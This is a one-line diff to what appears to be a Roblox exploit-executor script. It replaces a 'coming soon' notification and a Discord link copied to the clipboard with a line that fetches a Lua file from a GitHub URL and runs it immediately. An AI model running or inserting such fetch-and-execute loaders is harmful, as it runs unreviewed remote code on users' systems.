@@ -1,6 +1,1 @@
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "⚠️⚠️⚠️",
-    Text = "Script will available soon, discord copied",
-    Duration = 15
-})
-setclipboard("https://discord.gg/6CfpjUhHXd")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kingdos227/-/refs/heads/main/des.lua"))()
